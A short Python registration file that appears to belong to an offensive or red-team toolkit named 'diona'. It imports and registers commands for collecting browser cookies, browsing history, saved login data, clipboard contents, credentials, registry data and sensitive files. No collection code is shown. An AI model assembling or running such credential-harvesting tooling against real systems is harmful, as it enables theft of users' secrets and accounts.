"""Register sensitive module commands"""

from diona.project.cli.register import get_module_command_registry

# Import command classes
from diona.system.sensitive.browser.cookies.command import CookieCollectorCommand
from diona.system.sensitive.browser.history.command import HistoryCollectorCommand
from diona.system.sensitive.browser.logindata.command import LoginDataCollectorCommand
from diona.system.sensitive.clipboard.command import ClipboardCommand
from diona.system.sensitive.credential.command import CredentialCollectorCommand
from diona.system.sensitive.info.command import SystemInfoCommand
from diona.system.sensitive.regedit.command import RegistryCommand
from diona.system.sensitive.runcontext.command import RunContextCommand
from diona.system.sensitive.search.command import SearchCommand
from diona.system.sensitive.sensitivefile.command import SensitiveFileCommand


def register_sensitive_commands():
    """Register sensitive module commands to module_command_registry"""
    registry = get_module_command_registry()
    
    # Register commands
    commands = [
        CookieCollectorCommand,
        HistoryCollectorCommand,
        LoginDataCollectorCommand,
        ClipboardCommand,
        CredentialCollectorCommand,
        SystemInfoCommand,
        RegistryCommand,
        RunContextCommand,
        SearchCommand,
        SensitiveFileCommand
    ]
    
    for command in commands:
        if not registry.has_command(command.name):
            registry.register_command(command)
            # print(f"Registered command: {command.name}")


# Register commands when module is imported
register_sensitive_commands()
